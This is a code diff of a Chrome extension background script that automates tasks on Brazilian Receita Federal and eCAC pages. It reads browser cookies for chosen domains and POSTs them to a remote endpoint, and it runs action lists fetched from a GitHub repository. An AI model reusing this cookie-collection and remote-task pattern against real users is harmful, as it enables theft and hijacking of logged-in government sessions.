@@ -1,103 +1,93 @@
-const state = {urls: [], tasks: [], queryParam: {}};
-const actions = {
-    send: async body => {
-        body = {
-            payload: body,
-            urls: state.urls,
-            job: state.job,
-            gfk: state.gfk,
-            token: state.token,
-            inject: false
-        };
-        const url = state.endPoint + "/browser";
-        const endPoint = await fetch(url, {method: 'POST', body: JSON.stringify(body)});
-        endPoint.json().then(response => {
-            if (response.action)
-                actions[response.action.name](...response.action.args);
-        });
-    },
-    fetchGetJson: async (name, repo = 'json') => {
-        // https://github.com/drupalista-br/drupalista-br.github.io/tree/json
-        const url = "https://raw.githubusercontent.com/drupalista-br/drupalista-br.github.io/" + repo + "/" + name + ".json";
-        const response = await fetch(url);
-        return response.json();
-    },
-    getTasks: (job, isInject) => {
-        if (isInject)
-            job = "inject/" + job;
-
-        return actions.fetchGetJson(job);
-    },
-    cookiesEat: domains => {
-        return Promise.all(promises.cookiesGetAll(domains)).then(jars => {
-            let cookies = [];
-            jars.forEach(jar => cookies = jar.result.concat(cookies));
-
-            return Promise.all(promises.cookiesEat(cookies));
-        });
-    },
-    cookiesEatReload: (domains, to) => {
-        actions
-            .cookiesEat(domains)
-            .then(results => chrome.tabs.update(state.tabId, {"url": to}));
-    },
-    cookiesGetAllSend: domains => {
-        Promise.all(promises.cookiesGetAll(domains)).then(jars => {
-            let cookies = {};
-            jars.forEach(jar => cookies[jar.domain] = jar.result);
-
-            actions.send(cookies);
-        });
-    },
-    redirect: to => {
-        return chrome.tabs.update(state.tabId, {"url": to});
-    },
-    css: name => {
-        // https://github.com/drupalista-br/drupalista-br.github.io/tree/css
-        const url = "https://raw.githubusercontent.com/drupalista-br/drupalista-br.github.io/css/" + name + ".css";
-        fetch(url)
-            .then(response => response.text())
-            .then(css => {
-                chrome.scripting.insertCSS({
-                    target: {tabId: state.tabId},
-                    css: css,
-                });
-            });
-    }
+// https://stackoverflow.com/a/37576787/859837 | Using async/await with a forEach loop
+//   async / await does not wort in .forEach
+//   it gotta be either for...of or .map
+const state = {urls: []};
+const endPoint = () => state.queryParam.endPoint ?? "remote";
+const request = (repo, name) => {
+    // https://github.com/drupalista-br/drupalista-br.github.io/tree/[repo]
+    return {url: "https://raw.githubusercontent.com/drupalista-br/drupalista-br.github.io/" + repo + "/" + name};
 };
-const promises = {
-    cookiesGetAll: domains => {
-        const promises = [];
-        domains.forEach(domain => {
-            promises.push(chrome.cookies.getAll({ domain: domain }).then(cookies => {
-                return {
-                    method: "cookiesGetAll",
-                    domain: domain,
-                    result: cookies
-                };
-            }));
-        });
-        return promises;
+const actions = {
+    fetch: async (request, type = 'json') => {
+        var Return;
+        var data = {};
+        const api = () => {
+            const body = {
+                state: state,
+                request: request,
+            };
+            return {method: 'POST', body: JSON.stringify(body)};
+        };
+        if (request.api) {
+            request.url = state.endPoint + "/browser";
+            data = api();
+        }
+
+        await fetch(request.url, data)
+            .then(response => response[type]())
+            .then(content => Return = content);
+
+        return Return;
     },
-    cookiesEat: cookies => {
-        const promises = [];
-        cookies.forEach(cookie => {
+    cookies: {
+        getAll: async domains => {
+            const jar = {};
+            await Promise.all(domains.map(async domain => {
+                await chrome.cookies.getAll({ domain: domain }).then(cookies => {
+                    jar[domain] = cookies;
+                })
+            }));
+            return jar;
+        },
+        deleteAll: async domains => {
+            var Return = {};
             const url = cookie => {
                 if (cookie.domain.charAt(0) === ".")
                     cookie.domain = cookie.domain.replace(".", "");
 
                 return "https://" + cookie.domain + cookie.path;
             };
-            promises.push(chrome.cookies.remove({url: url(cookie), name: cookie.name}).then(cookie => {
-                // cookie contains only name, storeId and url.
-                return {
-                    method: "cookiesEat",
-                    result: cookie
-                };
-            }));
+            await actions.cookies.getAll(domains).then(async jar => {
+                await Promise.all(domains.map(async domain => {
+                    for (const cookie of jar[domain]) {
+                        await chrome.cookies.remove({url: url(cookie), name: cookie.name}).then(cookie => {
+                            // cookie contains only name, storeId and url.
+                            if (Array.isArray(Return[domain]))
+                                return Return[domain].push(cookie);
+
+                            Return[domain] = [cookie];
+                        });
+                    }
+                }));
+            });
+            return Return;
+        },
+        send: async domains => {
+            var Return;
+            await actions.cookies.getAll(domains).then(async jar => {
+                const request = {api: true, jar: jar};
+                await actions.fetch(request).then(content => Return = content);
+            });
+            return Return;
+        }
+    },
+    css: files => {
+        files.map(file => {
+            actions.fetch(request('css', file + ".css"), 'text').then(css => {
+                chrome.scripting.insertCSS({
+                    target: {tabId: state.tabId},
+                    css: css,
+                });
+            });
         });
-        return promises;
+    },
+    redirect: to => {
+        return chrome.tabs.update(state.tabId, {"url": to});
     }
+};
+const action = path => {
+    var action = actions;
+    return path.split('.').reduce((action, key) => action?.[key], action);
 };
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     const url = new URL(tab.url);
@@ -122,9 +112,13 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
         });
         return chrome.scripting.executeScript({target: {tabId: tabId}, files: ['inject.js']});
     };
+    const tabStatus = () => {
+        const neededStatus = url.searchParams.get("botTabStatus") ?? 'loading';
+        if (changeInfo.status === neededStatus)
+            return true;
+    };
     const starting = () => {
         const setState = (tasks, endPoints) => {
-            const endPoint = () => state.queryParam.endPoint ?? "remote";
             const cookieValue = () => {
                 const value = () => state.queryParam.job + "|" + state.queryParam.gfk + "|" + state.queryParam.token + "|" + endPoint();
                 if (state.queryParam.inject)
@@ -139,13 +133,13 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
             state.cookie = cookieValue();
         };
         if (state.queryParam.job) {
-            actions.fetchGetJson("endPoints").then(endPoints => {
-                actions.getTasks(state.queryParam.job, state.queryParam.inject).then(tasks => {
+            actions.fetch(request('json', 'endPoints.json')).then(endPoints => {
+                actions.fetch(request('json', state.queryParam.job + '.json')).then(tasks => {
                     setState(tasks, endPoints);
                     state.tasks.shift();
                     if (isInject()) return;
 
-                    actions[tasks[0].action.name](...tasks[0].action.args);
+                    tasks[0].actions.map(task => action(task.name)(...task.args));
                 });
             });
             return true;
@@ -154,71 +148,26 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     const onCourse = () => {
         if (state.tasks.length === 0) return;
         if (tab.url.includes(state.tasks[0].url)) {
-            const name = state.tasks[0].action.name;
-            const args = state.tasks[0].action.args;
+            const tasks = [...state.tasks[0].actions];
             state.urls.push(tab.url);
             state.tasks.shift();
 
             if (isInject()) return;
 
-            actions[name](...args);
-        }
-    };
-    const tabStatus = () => {
-        const neededStatus = url.searchParams.get("botTabStatus") ?? 'loading';
-        if (changeInfo.status === neededStatus)
-            return true;
-    };
-    const updateCheck = () => {
-        const hostname = 'bót.online'; // bót.online = xn--bt-5ja.online
-        const check = () => {
-            const installedVersion = () => chrome.runtime.getManifest().version;
-            const setCookie = () => {
-                const time = Math.floor(Date.now() / 1000);
-                chrome.cookies.set({
-                    domain: hostname,
-                    expirationDate: time + 864000, // 10 days
-                    name: "browserExtention",
-                    value: "updateCheck",
-                    path: "/",
-                    url: "https://" + hostname
-                });
-            };
-            actions.fetchGetJson('manifest', 'browser').then(manifestLatest => {
-                const isUpToDate = manifestLatest.version === installedVersion();
-                if (isUpToDate)
-                    return setCookie();
-
-                console.log('TODO: redirect to instructions page.');
-            });
-        };
-        if (state.queryParam.job) {
-            chrome.cookies.get({name: 'browserExtention', url: "https://" + hostname}, cookie => {
-                if (!cookie)
-                    check();
-            });
+            tasks.map(task => action(task.name)(...task.args));
         }
     };
     if (!tabStatus()) return;
 
     state.tabId = tabId;
     setStateQueryParam();
-    updateCheck();
     if (starting()) return;
 
     onCourse();
 });
 
 /*
-== cpf ==
-https://servicos.receita.fazenda.gov.br/servicos/cpf/consultasituacao/consultapublica.asp?cpf=81910851191&nascimento=25/08/1979&botJob=consulta_cpf&botInject&botToken=teste&botEndPoint=local
-
-== cnpj e qsa ==
-https://servicos.receita.fazenda.gov.br/Servicos/cnpjreva/Cnpjreva_Solicitacao.asp?cnpj=84432111000400&botJob=consulta_cnpj&botInject&botToken=teste22&botEndPoint=local
-https://servicos.receita.fazenda.gov.br/Servicos/cnpjreva/Cnpjreva_Solicitacao.asp?cnpj=03835832000116&botJob=consulta_cnpj&botInject&botToken=teste22&botEndPoint=local
-
-
 == Cookies Ecac ===
+https://cav.receita.fazenda.gov.br/autenticacao/login?botJob=ecac_acesso_gov_certificate&botGfk=gfk&botToken=token&botEndPoint=local
 
-chrome://newtab/?botJob=ecac_acesso_gov_certificate&botGfk=testeGfk&botToken=teste2&botEndPoint=local
 */
